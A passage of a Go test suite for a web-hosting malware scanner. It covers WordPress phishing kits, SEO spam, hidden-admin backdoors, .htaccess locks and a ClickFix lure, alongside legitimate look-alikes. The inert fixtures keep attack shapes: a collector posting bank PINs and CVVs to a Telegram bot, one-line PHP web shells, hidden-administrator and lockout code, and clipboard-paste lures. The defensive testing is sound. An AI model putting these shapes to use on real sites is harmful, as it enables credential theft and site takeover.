		return s.checkContent(filepath.Join(root, rel), ".php", []byte(inert))
	}
	for _, rel := range []string{"wp-admin/css/worksec.php", "wp-includes/css/worksec.php", "wp-admin/images/worksec.php"} {
		if d := check(rel); d == nil || d.Signature != "PHP.Planted.WordPressCoreSpray" || d.Category != CatVirus {
			t.Errorf("%s: %+v", rel, d)
		}
	}
	if d := check("wp-includes/images/lonely.php"); d == nil || d.Category != CatSuspicious {
		t.Errorf("one PHP file in core images: %+v", d)
	}
	// Every copy, also outside the asset folders, and also the last ones
	// once the others are quarantined.
	if d := check("wp-includes/ID3/worksec.php"); d == nil || d.Signature != "PHP.Planted.WordPressCoreSpray" {
		t.Errorf("copy outside the asset folders: %+v", d)
	}
	for _, d := range []string{"wp-admin/css", "wp-admin/images", "wp-includes/css", "wp-includes/ID3", "wp-includes/IXR"} {
		os.Remove(filepath.Join(root, d, "worksec.php"))
	}
	if d := check("wp-includes/Text/worksec.php"); d == nil || d.Signature != "PHP.Planted.WordPressCoreSpray" {
		t.Errorf("last copy: %+v", d)
	}
	// Core's own names in several folders (a release newer than the known
	// files): not a spray.
	for _, d := range []string{"wp-admin", "wp-admin/network", "wp-admin/user"} {
		put(d+"/about.php", inert)
	}
	for _, rel := range []string{"wp-includes/fonts/class-wp-font-face.php", "wp-admin/includes/custom-helper.php", "wp-admin/network/about.php"} {
		if d := check(rel); d != nil && strings.HasPrefix(d.Signature, "PHP.Planted.") {
			t.Errorf("%s: %s", rel, d.Signature)
		}
	}
	// Not a WordPress site: a folder that is only called wp-admin.
	other := filepath.Join(t.TempDir(), "u", "public_html", "wp-admin", "css")
	os.MkdirAll(other, 0o755)
	if d := s.checkContent(filepath.Join(other, "theme.php"), ".php", []byte(inert)); d != nil {
		t.Errorf("not WordPress: %s", d.Signature)
	}
}

// business100 (2026-10-26): two SEO doorway farms (sahibsul, bashopco)
// had no finding. Their self-healing kit kept dormant copies named
// .sys_<hex>.php, .sess_<hex>.php, .tmp_<hex>.php, .cache_<hex>.php
// (mode 000) and restore scripts in ~/logs/. Hidden PHP named by random
// hex, hidden PHP without permissions and PHP in ~/logs are malware;
// another hidden PHP file is suspicious (the AI looks); developer tools'
// dotfiles in plugins and packages stay alone.
func TestFleetHiddenAndLogsPHP(t *testing.T) {
	s := newScanner(t)
	inert := "<?php /* inert test fixture */ echo 'x';"
	dir := filepath.Join(t.TempDir(), "home2", "u")
	write := func(rel string, mode os.FileMode) string {
		p := filepath.Join(dir, rel)
		os.MkdirAll(filepath.Dir(p), 0o755)
		os.WriteFile(p, []byte(inert), 0o644)
		os.Chmod(p, mode)
		return p
	}
	// The test runs from a temporary folder: name it like a home.
	homeOf := func(p string) string { return "/home2/u" + strings.TrimPrefix(p, dir) }
	check := func(p string) *Detection {
		return plantedByName(homeOf(p), func(string) int { return plantedMode(p) })
	}
	for rel, sig := range map[string]string{
		"public_html/assets/.sys_9f3a1c7e2b.php":  "PHP.Planted.HiddenRandomName",
		"public_html/.sess_0a1b2c3d4e5f.php":      "PHP.Planted.HiddenRandomName",
		"cavescode.com/app/.cache_deadbeef01.php": "PHP.Planted.HiddenRandomName",
		"logs/cache_gc.php":                       "PHP.Planted.InLogsFolder",
		"logs/example.com/restore_config.php":     "PHP.Planted.InLogsFolder",
	} {
		if d := check(write(rel, 0o644)); d == nil || d.Signature != sig || d.Category != CatVirus {
			t.Errorf("%s: %+v", rel, d)
		}
	}
	if d := check(write("public_html/en/.sitemap_indo.php", 0)); d == nil || d.Signature != "PHP.Planted.HiddenDormant" {
		t.Errorf("dormant hidden copy: %+v", d)
	}
	if d := check(write("public_html/en/.sitemap_indo2.php", 0o644)); d == nil || d.Category != CatSuspicious {
		t.Errorf("hidden PHP: %+v", d)
	}
	for _, rel := range []string{
		"public_html/wp-content/plugins/x/.php-cs-fixer.dist.php",
		"public_html/wp-content/plugins/x/.phpstorm.meta.php",
		"public_html/vendor/y/.php_cs.dist.php",
		"public_html/wp-content/plugins/x/.rector.php",
		"laravel/app/.env.local.php",
		"public_html/index.php",
		"public_html/logs/view.php", // a site's own folder called logs
	} {
		if d := check(write(rel, 0o644)); d != nil {
			t.Errorf("%s: %s", rel, d.Signature)
		}
	}
	// Through the content check too (scan and recheck).
	if d := s.checkContent("/home2/u/logs/cache_gc.php", ".php", []byte(inert)); d == nil || d.Signature != "PHP.Planted.InLogsFolder" {
		t.Errorf("content check: %+v", d)
	}
}

// server1 (2026-10-28): a bank phishing kit, casino SEO spam, fake plugins
// and a WooCommerce-named loader, with no finding (101 files). Inert
// fixtures built the same way; plugins and pages that look alike stay clean.
func TestFleetPhishingCasinoAndLoaders(t *testing.T) {
	s := newScanner(t)
	home := t.TempDir()
	put := func(rel, body string) string {
		p := filepath.Join(home, "public_html", rel)
		os.MkdirAll(filepath.Dir(p), 0o755)
		os.WriteFile(p, []byte(body), 0o644)
		return p
	}
	check := func(p string) *Detection {
		t.Helper()
		info, _ := os.Lstat(p)
		d, err := s.CheckFile(p, info, s.Settings.Get().Scanner)
		if err != nil && err != ErrTrusted {
			t.Fatal(err)
		}
		return d
	}
	pieces := strings.Repeat("$k = 'wp'.'_fo'.'ot'.'er'; ", 25)
	hashNames := ""
	for i := range 12 {
		hashNames += fmt.Sprintf("$var_%032x = 'x'; ", i)
	}
	collector := "<?php\n$cfg = ['tg_token' => 'inert', 'tg_chat' => '1'];\n$ip = $_SERVER['REMOTE_ADDR'];\n" +
		"$msg = 'clave: ' . $_POST['clave'] . ' sms: ' . $_POST['sms'] . ' cvv: ' . $_POST['cvv'];\n" +
		"file_get_contents('https://api.telegram.org/bot' . $cfg['tg_token'] . '/sendMessage?text=' . urlencode($msg));\n"
	casino := strings.Repeat("<li><a href=\"https://example.invalid/c\">online casino free spins no deposit</a> best slots bonus</li>\n", 16)
	hidden := "<section style=\"position:absolute;width:1px;height:1px;overflow:hidden;clip:rect(0,0,0,0)\"><ul>\n" + casino + "</ul></section>\n"
	doorway := strings.Repeat("<link rel=\"stylesheet\" href=\"/wp-content/themes/t/style.css\">\n", 5) +
		strings.Repeat("<p>Claim free spins and a deposit bonus at the best online casino with no deposit slots.</p>\n", 10)
	put("kit/acciones.php", collector)
	put("wp-content/mu-plugins/section.html", hidden)
	for rel, sig := range map[string]string{
		"wp-content/plugins/fast-checker-572d/inc/class-handler.php":   "PHP.Obfuscated.SplitStrings",
		"wp-content/plugins/woocommerce_inputs/woocommerce-load.php":   "PHP.Obfuscated.HashNames",
		"wp-content/plugins/woocommerce_inputs/woocommerce_inputs.php": "PHP.Backdoor.TelegramDeadDrop",
		"wp-content/plugins/woocommerce_inputs/fhelpers.php":           "PHP.SEOSpam.RemoteFooterLinks",
		"wp-content/plugins/woo_inputs/woocommerce_inputs.php":         "PHP.Backdoor.HiddenPluginLoader",
		"kit/acciones.php":                                    "Phishing.Collector.Telegram",
		"kit/index.html":                                      "Phishing.KitPage",
		"wp-content/mu-plugins/section.html":                  "HTML.SEOSpam.HiddenGambling",
		"wp-content/mu-plugins/section.php":                   "PHP.SEOSpam.HiddenGamblingPrinter",
		"100-free-spins-no-deposit.html":                      "HTML.SEOSpam.GamblingDoorway",
		"wp-content/uploads/0123456789abcdef0123456789abcdef": "Dropper.Base64URL",
	} {
		var body string
		switch sig {
		case "PHP.Obfuscated.SplitStrings":
			body = "<?php\nclass H { function __construct() { " + pieces + " add_action($k, [$this, 'p']); } }\n"
		case "PHP.Obfuscated.HashNames":
			body = "<?php\n" + hashNames + "\n$r = wp_remote_get('https://example.invalid/');\n"
		case "PHP.Backdoor.TelegramDeadDrop":
			body = "<?php\n$page = wp_remote_get('https://t.me/s/inert_channel');\n$d = 'x';\nwp_insert_user(['user_login' => 'inert', 'role' => 'administrator']);\n"
		case "PHP.SEOSpam.RemoteFooterLinks":
			body = "<?php\nadd_action('wp_footer', function () { $r = wp_remote_get('https://example.invalid/api/links', ['sslverify' => false]); echo wp_remote_retrieve_body($r); });\n"
		case "PHP.Backdoor.HiddenPluginLoader":
			body = "<?php\nadd_filter('all_plugins', function ($p) { unset($p[plugin_basename(__FILE__)]); return $p; });\n" +
				"add_filter('plugin_action_links_' . plugin_basename(__FILE__), '__return_empty_array');\n" +
				"$z = wp_remote_get('https://example.invalid/wp-plugin/?update-check');\nfile_put_contents('/tmp/inert.zip', wp_remote_retrieve_body($z));\n$f = __DIR__ . '/r.php';\ninclude $f;\n"
		case "Phishing.Collector.Telegram":
			body = collector
		case "Phishing.KitPage":
			body = "<form action=\"send.php\"><input name=\"clave\" type=\"password\"></form>\n<script>const BACKEND='acciones.php';fetch(BACKEND+'?accion=enviar',{method:'POST'})</script>\n"
		case "HTML.SEOSpam.HiddenGambling":
			body = hidden
		case "PHP.SEOSpam.HiddenGamblingPrinter":
			body = "<?php\n$file = __DIR__ . '/section.html';\n$print = function () use ($file) { readfile($file); };\nadd_action('wp_footer', $print);\n"
		case "HTML.SEOSpam.GamblingDoorway":
			body = doorway
		case "Dropper.Base64URL":
			body = base64.StdEncoding.EncodeToString([]byte("https://example.invalid/inert"))
		}
		if d := check(put(rel, body)); d == nil || d.Signature != sig || d.Category != CatVirus {
			t.Errorf("%s: want %s, got %+v", rel, sig, d)
		}
	}
	// Look-alikes: a one-time-code plugin sending by Telegram, a casino
	// site's own page with a hidden menu, a page cache, a footer link
	// plugin with its own links, a hex-named cache file, a login page.
	for rel, body := range map[string]string{
		"wp-content/plugins/tg-otp/otp.php": "<?php\n$chat = get_option('chat_id');\n$ip = $_SERVER['REMOTE_ADDR'];\n$otp = wp_rand(100000, 999999);\n" +
			"wp_remote_post('https://api.telegram.org/bot' . get_option('token') . '/sendMessage', ['body' => ['chat_id' => $chat, 'text' => 'Your OTP code for login: ' . $otp . ' (sms fallback, pin reset, password reset)']]);\n",
		"casino-reviews.html": "<nav style=\"display:none\" id=\"m\">" + strings.Repeat("<a href=\"/casino-reviews/\">Casino reviews</a> <a href=\"/free-spins/\">Free spins</a>\n", 10) + "</nav>\n" +
			"<a class=\"skip\" style=\"position:absolute;left:-10000px;width:1px;height:1px\" href=\"#main\">Skip to content</a>\n" + strings.Repeat("<p>Our online casino reviews compare free spins, slots and the welcome bonus of each casino.</p>\n", 10) +
			"<a href=\"/a\">a</a><a href=\"/b\">b</a><a href=\"/c\">c</a>\n",
		"wp-content/cache/page/best-casino-bonus.html":      doorway,
		"wp-content/plugins/links/links.php":                "<?php\nadd_action('wp_footer', function () { echo '<a href=\"https://example.test/partner\">Partner</a>'; });\n",
		"wp-content/cache/ffffffffffffffffffffffffffffffff": "a:1:{s:4:\"html\";s:5:\"inert\";}",
		"login.html": "<form action=\"wp-login.php\" method=\"post\"><input type=\"password\" name=\"pwd\"></form>\n",
	} {
		if d := check(put(rel, body)); d != nil {
			t.Errorf("%s flagged: %+v", rel, d)
		}
	}
}

// server1 (2026-10-28, full scan 59): 9,790 macOS metadata files
// (__MACOSX/…/._Kernel.php, AppleDouble) as hidden PHP, a PsySH fixture,
// PHP-CS-Fixer's settings requiring each other as a hidden include, and
// phpstan's string escaper (a regex of byte ranges, assert()) as
// char-encoded obfuscation. The real thing stays caught.
func TestFleetMacMetadataAndDevFiles(t *testing.T) {
	s := newScanner(t)
	apple := append([]byte{0, 5, 0x16, 7, 0, 2, 0, 0}, []byte("Mac OS X        \x00\x02\x00\x00\x00\x09com.apple.quarantine")...)
	clean := map[string][]byte{
		"/home2/u/site/__MACOSX/app/vendor/laravel/framework/src/Illuminate/Foundation/Http/._Kernel.php": apple,
		"/home2/u/site/vendor/x/._Select.php":                                    apple,
		"/home2/u/public_html/vendor/psy/psysh/test/fixtures/project/.psysh.php": []byte("<?php\nreturn array('useReadline' => false);\n"),
		"/home2/u/site/vendor/barryvdh/laravel-ide-helper/.php-cs-fixer.tests.php": []byte("<?php\nrequire __DIR__ . '/vendor/autoload.php';\n" +
			"$config = require __DIR__ . '/.php-cs-fixer.common.php';\nreturn (new PhpCsFixer\\Config())->setRules($config);\n"),
		"/home2/u/site/vendor/phpstan/phpdoc-parser/src/Ast/ConstExpr/ConstExprStringNode.php": []byte("<?php declare(strict_types = 1);\nnamespace PHPStan\\PhpDocParser\\Ast\\ConstExpr;\n" +
			"class ConstExprStringNode {\n\tprivate function escape(string $v): string {\n\t\t$regex = '/(\n" +
			strings.Repeat("\t\t\t| [\\xC0-\\xC1] | \\xE0(?=[\\x80-\\x9F]) | [\\xF0-\\xF4](?![\\x80-\\xBF]{3}) | (?<=[\\x00-\\x7F\\xF5-\\xFF])[\\x80-\\xBF]\n", 6) +
			"\t\t)/x';\n\t\treturn preg_replace_callback($regex, static function ($m) {\n\t\t\tassert(strlen($m[0]) === 1);\n\t\t\treturn '\\\\x' . dechex(ord($m[0]));\n\t\t}, $v);\n\t}\n}\n"),
	}
	for p, body := range clean {
		if d := s.checkContent(p, ".php", body); d != nil {
			t.Errorf("%s flagged: %+v", p, d)
		}
	}
	for p, body := range map[string]string{
		// Real PHP behind a "._" name is still a hidden PHP file.
		"/home2/u/public_html/wp-content/._x.php": "<?php echo 'inert';",
		// A hidden include of a planted name is still a loader.
		"/home2/u/public_html/wp-content/index2.php": "<?php include __DIR__ . '/.cache_5f2a.php';",
		// Escapes spelling words, run by eval, are still obfuscation.
		"/home2/u/public_html/wp-content/x.php": "<?php\n" + strings.Repeat("$a[] = \"\\x69\\x6e\\x65\\x72\\x74\";\n", 12) + "eval(implode('', $a));\n",
	} {
		if d := s.checkContent(p, ".php", []byte(body)); d == nil {
			t.Errorf("%s not found", p)
		}
	}
}

// server1 (2026-10-29, full scan 62): phpList's admin/.htaccess refuses
// .php and .inc and allows its three entry points, and was quarantined as
// an attack kit's lock. Without the kits' extension list (py, exe, PHP in
// mixed case, suspected) and with names allowed by their ending, the lock
// is an application's; the kits' own locks stay malware, also the ones the
// AI called clean.
func TestFleetAppHtaccessLock(t *testing.T) {
	phplist := "<FilesMatch \"\\.(php|inc)$\">\n\t<IfModule mod_authz_core.c>\n\t\tRequire all denied\n\t</IfModule>\n</FilesMatch>\n" +
		"<FilesMatch \"(index.php|connector.php|upload.php)$\">\n\t<IfModule mod_authz_core.c>\n\t\tRequire all granted\n\t</IfModule>\n</FilesMatch>\n"
	if d := htaccessHack([]byte(phplist)); d != nil {
		t.Errorf("application lock: %+v", d)
	}
	for _, kit := range []string{
		"<FilesMatch \".*\\.(py|exe|phtml|php|PHP|Php|PHp|pHp|suspected)$\">\nOrder Allow,Deny\nDeny from all\n</FilesMatch>\n<FilesMatch \"^(wp-login.php)$\">\nOrder Allow,Deny\nAllow from all\n</FilesMatch>",
		"<FilesMatch '.(py|exe|phtml|php|PHP|Php|php5|suspected)$'>\r\nOrder allow,deny\r\nDeny from all\r\n</FilesMatch>\r\n<FilesMatch '^(index.php)$'>\r\nOrder allow,deny\r\nAllow from all\r\n</FilesMatch>",
		"<FilesMatch '.(py|exe|php|PHP|Php|suspected)$'>\nOrder allow,deny\nDeny from all\n</FilesMatch>",
		"<FilesMatch \"\\.php$\">\nRequire all denied\n</FilesMatch>\n<FilesMatch \"^(index\\.php|x7shell\\.php)$\">\nRequire all granted\n</FilesMatch>",
	} {
		if d := htaccessHack([]byte(kit)); d == nil || d.Category != CatVirus || d.Signature != "Htaccess.Hacked.PHPLock" {
			t.Errorf("kit lock: %+v", d)
		}
	}
}

// server1 (2026-10-29, full scan 62): official plugin and library files
// quarantined. Each inert fixture keeps the shape that fired; the attack
// next to it stays caught.
func TestFleetLibrariesOfScan62(t *testing.T) {
	s := newScanner(t)
	check := func(path string, body string) *Detection {
		t.Helper()
		return s.checkContent(path, extOf(path), []byte(body))
	}
	masks := ""
	for i := range 60 {
		masks += fmt.Sprintf("\t\t%d => \"\\xff\\xff\\xff\\x%02x\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\",\n", i, i)
	}
	big := strings.Repeat("// LayerSlider admin actions: sliders, revisions, templates.\nfunction ls_action_x() { update_option('ls_x', 1); }\n", 300)
	gotos := ""
	for i := range 10 {
		gotos += fmt.Sprintf("if ($m !== 'GET') { goto not_simple_trailing_slash_GET_method_%d; }\nreturn rawurldecode($p);\nnot_simple_trailing_slash_GET_method_%d:\n", i, i)
	}
	clean := map[string]string{
		// Wordfence wf-waf utils.php: IPv6 masks as binary strings.
		"/home2/u/public_html/wp-content/plugins/wordfence/vendor/wordfence/wf-waf/src/lib/utils.php": "<?php\nclass wfWAFUtils {\n\tstatic function hmac($algo, $key) { return $algo($key); }\n\tstatic $masks = array(\n" + masks + "\t);\n}\n",
		// Vafpress (JNews, Rehub): the AJAX wrapper calls allowed functions only.
		"/home2/u/public_html/wp-content/plugins/jnews-essential/lib/vp/bootstrap.php": "<?php\nfunction vp_ajax_wrapper() {\n\t$function = $_POST['func'];\n\t$params = $_POST['params'];\n\tif (VP_Security::instance()->is_function_whitelisted($function)) {\n\t\t$result = call_user_func_array($function, $params);\n\t}\n}\n",
		// LayerSlider actions.php: an importer behind nonce checks.
		"/home2/u/public_html/wp-content/plugins/LayerSlider/assets/wp/actions.php": "<?php\n" + big + "function ls_import_online() {\n\tcheck_ajax_referer('ls-import-demos', 'security');\n\t$slider = urlencode($_GET['slider']);\n\t$downloadPath = sys_get_temp_dir() . '/' . sanitize_file_name($_GET['slider']) . '.zip';\n\tfile_put_contents($downloadPath, wp_remote_retrieve_body(wp_remote_get('https://example.invalid/' . $slider)));\n}\n",
		// SquirrelMail and SitePad: /e with a fixed replacement.
		"/home2/u/public_html/squirrel/functions/encode/koi8_r.php": "<?php\nfunction charset_encode_koi8_r($string) {\n\treturn preg_replace(\"/([\\200-\\377])/e\", \"'&#' . ord('\\\\1') . ';'\", $string);\n}\n",
		// Symfony's build script: commands from the command line's arguments.
		"/home2/u/public_html/vendor/symfony/symfony/.github/build-packages.php": "<?php\nif (3 > $_SERVER['argc']) { exit(1); }\n$dirs = $_SERVER['argv'];\n$base = trim(shell_exec(sprintf('git merge-base %s HEAD', array_shift($dirs))));\n",
		// A generated router (Symfony's dumper fixtures): labelled gotos.
		"/home2/u/public_html/vendor/symfony/symfony/src/Symfony/Component/Routing/Tests/Fixtures/dumper/url_matcher6.php": "<?php\nfunction match($p, $m) {\n" + gotos + "}\n",
		// phpxmlrpc: the saved error handler is called by its name.
		"/home2/u/public_html/wp-content/plugins/x/xmlrpc-3.0/lib/xmlrpcs.inc": "<?php\nfunction _xmlrpcs_errorHandler($c, $e) {\n\t$GLOBALS['_xmlrpcs_prev_ehandler']($c, $e);\n}\nfunction parse($d) { return gzuncompress($d); }\n",
		// Unyson: a random string built with chr(), far from any callback.
		"/home2/u/public_html/wp-content/plugins/unyson/framework/helpers/general.php": "<?php\nfunction fw_rand($sha) {\n\t$rnd = '';\n\tfor ($c = 0; $c < 32; $c += 2) { $rnd .= chr( hexdec( $sha[ $c ] . $sha[ $c + 1 ] ) ); }\n\treturn $rnd;\n}\n" + strings.Repeat("function fw_helper_x() { return get_option('fw_x'); }\n", 60) + "function fw_call($cb) { return isset($_SERVER['windir']) ? $cb() : $cb(); }\n",
		// A Telegram login-alert plugin with its own settings form.
		"/home2/u/public_html/wp-content/plugins/tg-alerts/admin.php": "<?php\nwp_remote_get('https://api.telegram.org/bot' . get_option('tg_t') . '/sendMessage?text=login');\n?><form method=\"post\"><input type=\"password\" name=\"tg_t\"></form>\n",
		// LiteSpeed Cache's settings, PicoFeed's site rules, Filament stubs.
		"/home2/u/public_html/wp-content/.litespeed_conf.php":                                                   "<?php exit; // LiteSpeed Cache runtime configuration. Do not edit. ?>\n{\"debug\":0,\"object-kind\":false}",
		"/home2/u/public_html/wp-content/plugins/penci-feeds/classes/libs/fguillot/PicoFeed/Rules/.wsj.com.php": "<?php\nreturn array(\n\t'grabber' => array('%.*%' => array('test_url' => 'https://example.test/a', 'body' => array('//div[@class=\"article\"]'))),\n);\n",
		"/home2/u/public_html/vendor/filament/forms/.stubs.php":                                                 "<?php\nnamespace Livewire\\Features;\nclass Testable { public function fillForm(array $state = []): static { return $this; } }\n",
	}
	for p, body := range clean {
		if d := check(p, body); d != nil {
			t.Errorf("%s flagged: %+v", p, d)
		}
	}
	// Really Simple Security's prepend; another prepend is still reported.
	rss := "; BEGIN Really Simple Auto Prepend File\nauto_prepend_file = '/home/u/public_html/wp-content/advanced-headers.php'\n; END Really Simple Auto Prepend File"
	if d := configLoader([]byte(rss)); d != nil {
		t.Errorf("Really Simple Security prepend flagged: %+v", d)
	}
	if d := configLoader([]byte("auto_prepend_file = '/home/u/public_html/wp-content/advanced-headers.php'")); d == nil {
		t.Error("unmarked prepend not reported")
	}
	// js-beautify's unpacker inside node_modules.
	if d := capHeuristic("/home2/u/nodevenv/app/10/lib/node_modules/js-beautify/js/src/unpackers/myobfuscate_unpacker.js", ".js",
		&Detection{CatSuspicious, "JS.Injection.DocumentWriteUnescape"}); d != nil {
		t.Errorf("node package flagged: %+v", d)
	}
	// A Perl script holding a web shell is still a web shell (PHP runs it
	// when it is included).
	if d := analyze(".pl", []byte("#!/usr/bin/perl\n<?php system($_GET['x']); ?>\n")); d == nil {
		t.Error("shell behind a perl shebang not found")
	}
	// A Perl program carrying PHP as text (SquirrelMail's conf.pl).
	perl := "#!/usr/bin/env perl\nmy $ok = eval(\"require 'conf.pl'\");\nprint CF \"<?php\\n\";\n" + strings.Repeat("print CF \"$\" . \"conf\" . \"['\" . \"$k\" . \"'] = '\" . \"$v\" . \"';\\n\";\n", 30)
	if v := analyzePHP([]byte(perl)); v == nil || v.category != CatSuspicious {
		t.Fatalf("perl fixture does not reproduce conf.pl: %+v", v)
	}
	if d := analyze(".pl", []byte(perl)); d != nil {
		t.Errorf("perl program flagged: %+v", d)
	}
	// composer and php-cs-fixer shipped as phars without an extension.
	phar := buildPhar("<?php Phar::mapPhar('composer.phar'); require 'phar://composer.phar/bin/composer'; ",
		map[string]string{"src/Util/Eval.php": "<?php namespace Composer\\Util; class E { function run($code) { return eval($code); } }"})
	if old := analyze("", phar); old == nil {
		t.Fatal("phar fixture does not reproduce the old false positive")
	}
	if d := check("/home2/u/public_html/vendor/phpunit/phpunit/tools/composer", string(phar)); d != nil {
		t.Errorf("extensionless phar flagged: %+v", d)
	}
	for p, body := range map[string]string{
		"/home2/u/public_html/wp-content/x1.php":   "<?php\n$f = $_POST['f'];\ncall_user_func_array($f, array($_POST['a']));\n",
		"/home2/u/public_html/wp-content/x2.php":   "<?php\necho preg_replace('/.*/e', $_POST['c'], 'x');\n",
		"/home2/u/public_html/wp-content/x3.php":   "<?php\necho preg_replace(\"/(.*)/e\", \"eval('\\\\1')\", 'x');\n",
		"/home2/u/public_html/wp-content/x4.php":   "<?php\nsystem($_SERVER['HTTP_CMD']);\n",
		"/home2/u/public_html/wp-content/x5.php":   "<?php\n$GLOBALS['_1452_'][3](base64_decode('aW5lcnQ='));\n",
		"/home2/u/public_html/wp-content/x6.php":   "<?php\n$k = 'x';\n$s = '';\nfor ($i = 0; $i < 9; $i++) { $s .= chr(ord($k[$i % 1]) ^ 7); }\n$s($_POST['a']);\n",
		"/home2/u/public_html/wp-content/.x_7.php": "<?php exit_soon(); include $_GET['p'];",
		// A SumUp kit page: visits reported to a bot, an OTP form.
		"/home2/u/public_html/wp-admin/sumup/web/email.php": "<?php\nfunction notify($m, $t, $c) { return file_get_contents('https://api.telegram.org/bot' . $t . '/sendMessage?chat_id=' . $c . '&text=' . urlencode($m)); }\nnotify('user in the email page!', $bot_token, $rez_chat);\n?><title>Authentication - EMAIL</title><form method=\"post\" action=\"send.php\"><input name=\"11\" autocomplete=\"one-time-code\" maxlength=\"1\"></form>\n",
		// A packer's payload in one long escaped string.
		"/home2/u/public_html/recommend.php":                    "<?php\n$p = base64_decode(\"" + strings.Repeat("\\x61\\x57\\x35\\x6c", 30) + "\");\n$k = openssl_decrypt($p, 'aes-128-cbc', 'k');\n",
		"/home2/u/public_html/wp-content/x8.php":                "<?php\n$c = $_POST['c'];\necho preg_replace('/.*/e', '\\0', $c);\n",
		"/home2/u/public_html/wp-content/x9.php":                "<?php\n$f = $_POST['f'];\nif (in_array($f, array('system', 'exec'))) { call_user_func_array($f, array($_POST['a'])); }\n",
		"/home2/u/public_html/wp-content/.stubs_9f3a1c7e2b.php": "<?php echo 'inert';",
		"/home2/u/public_html/wp-content/.rules.php":            "<?php return require 'inert-loader.txt';",
		"/home2/u/public_html/wp-content/.rules2.php":           "<?php return array('a' => Loader::run('inert'));",
	} {
		if d := check(p, body); d == nil {
			t.Errorf("%s not found", p)
		}
	}
}

// server1 and server100 (2026-10-30): the ClickFix kit - a fake Cloudflare
// human check copying a command for the visitor to paste into the Run box,
// the plugins serving it, a hidden administrator, an owner lockout, the
// .htaccess sending the site to the check, a hidden payload and doorway
// loaders; 1 of 1,986 files had a finding. Inert shapes of each, then the
// look-alikes real sites have.
func TestFleetClickFixKit(t *testing.T) {
	s := newScanner(t)
	home := t.TempDir()
	put := func(rel, body string) string {
		p := filepath.Join(home, "public_html", rel)
		os.MkdirAll(filepath.Dir(p), 0o755)
		os.WriteFile(p, []byte(body), 0o644)
		return p
	}
	check := func(p string) *Detection {
		t.Helper()
		info, _ := os.Lstat(p)
		d, err := s.CheckFile(p, info, s.Settings.Get().Scanner)
		if err != nil && err != ErrTrusted {
			t.Fatal(err)
		}
		return d
	}
	steps := "<p>Verify you are human by completing the action below.</p><ol><li>Press &amp; hold the Windows Key <svg viewBox='0 0 24 24'></svg> + <b>R</b></li>" +
		"<li>In the verification window, press <b>Ctrl</b> + <b>V</b></li><li>Press <b>Enter</b></li></ol>"
	var z bytes.Buffer
	zw, _ := flate.NewWriter(&z, flate.BestCompression)
	zw.Write([]byte("$a = base64_decode('aW5lcnQ='); eval('/* inert */' . $a);"))
	for i := range 80 {
		fmt.Fprintf(zw, " /* %x */", md5.Sum([]byte{byte(i)}))
	}
	zw.Close()
	hash := "$wp$2y$10$" + strings.Repeat("a", 53)
	kit := map[string]struct{ sig, body string }{
		"wp-content/plugins/seo-1772128746/captcha.html": {"Phishing.ClickFix.FakeVerification",
			"<html><body>" + steps + "<script>var command = 'echo inert';document.getElementById('cb').onclick=function(){navigator.clipboard.writeText(command);}</script></body></html>"},
		"wp-content/mu-plugins/core-banner.php": {"Phishing.ClickFix.FakeVerification",
			"<?php\n/* Plugin Name: Core Banner */\nadd_action( 'template_redirect', function () { if ( is_user_logged_in() ) return; echo '<title>Just a moment...</title>" +
				strings.ReplaceAll(steps, "'", `\'`) + "<script>function c(e){e.clipboardData.setData(\\'text/plain\\', \\'echo inert\\');}document.execCommand(\\'copy\\');</script>'; exit; } );\n"},
		"wp-content/plugins/wp-image-reloaded/assets/js/captcha-loader.js": {"Phishing.ClickFix.FakeVerification",
			"var t={en:{lure:\"I'm not a robot\",s1:\"Hold the Windows key and press R\",s2:\"Press Ctrl+V to paste verification code\"}};\nfunction copy(x){navigator.clipboard.writeText(x).catch(function(){document.execCommand('copy')})}\n"},
		"wp-content/plugins/adminimize-images-soon/cf-captcha-windows.php": {"Phishing.ClickFix.FakeClearance",
			"<?php\n/* Plugin Name: CF Captcha */\nadd_action('init', function () { if (isset($_GET['p']) && $_GET['p'] === '1') { readfile(__DIR__ . '/captcha.html'); exit; } });\n" +
				"add_action('wp_footer', function () { ?><script>window.addEventListener('message', function () { document.cookie = 'cf_clearance=1;path=/'; });</script><?php });\n"},
		"wp-content/plugins/cf-security-shield/cf-security-shield.php": {"PHP.Backdoor.DNSTXTDeadDrop",
			"<?php\nadd_action('wp_ajax_nopriv_cf_get_text', 'cf_text');\nfunction cf_text() { $r = dns_get_record('example.invalid', DNS_TXT); if ($r && isset($r[0]['txt'])) { wp_send_json_success(array('text' => $r[0]['txt'])); } }\n"},
		"wp-content/mu-plugins/service-admin-bootstrap.php": {"PHP.Backdoor.HiddenAdmin",
			"<?php\ndefine('SAB_ROLE', 'administrator');\ndefine('SAB_HASH', '" + hash + "');\nadd_action('init', function () { global $wpdb; $id = wp_insert_user(array('user_login' => 'svc', 'user_pass' => wp_generate_password(32), 'role' => SAB_ROLE));\n" +
				"$wpdb->update( $wpdb->users, array( 'user_pass' => SAB_HASH ), array( 'ID' => $id ) ); });\nadd_filter('pre_count_users', function ($r) { return $r; });\nadd_action('pre_user_query', function ($q) { $q->query_where .= ' AND ID <> 0'; });\n"},
		"wp-content/mu-plugins/cache.php": {"PHP.Backdoor.LoginLockdown",
			"<?php\n/* Plugin Name: Core Functions */\nadd_filter('authenticate', function ($user, $u, $p) { if (!empty($u) || !empty($p)) { return new WP_Error('lockdown', 'Error'); } return $user; }, 30, 3);\n" +
				"add_filter('allow_password_reset', '__return_false');\nadd_filter('rest_authentication_errors', function ($result) { return new WP_Error('lockdown', 'Error'); });\n"},
		"hiroshi.php": {"PHP.SEOSpam.RemoteDoorway",
			"<?php\n$duri = isset($_SERVER['REQUEST_URI']) ? $_SERVER['REQUEST_URI'] : '/';\n$web = 'hp?web=' . $host . '&zz=' . disbot() . '&uri=' . $duri . '&lang=' . $lang;\n"},
		".6c02c6d7": {"PHP.Dropper.HiddenPayload", base64.StdEncoding.EncodeToString(z.Bytes())},
	}
	for rel, k := range kit {
		if d := check(put(rel, k.body)); d == nil || d.Signature != k.sig || d.Category != CatVirus {
			t.Errorf("%s: want %s, got %+v", rel, k.sig, d)
		}
	}
	for rel, body := range map[string]string{
		// A how-to with a copy button: no human check.
		"kb/flush-dns.html": "<p>Press <b>Win</b> + <b>R</b>, then <b>Ctrl</b> + <b>V</b> and Enter to run the command in the terminal.</p>" +
			"<button onclick=\"navigator.clipboard.writeText('ipconfig /flushdns')\">Copy</button>",
		// A CAPTCHA and a copy-coupon button on one page: nothing to paste anywhere.
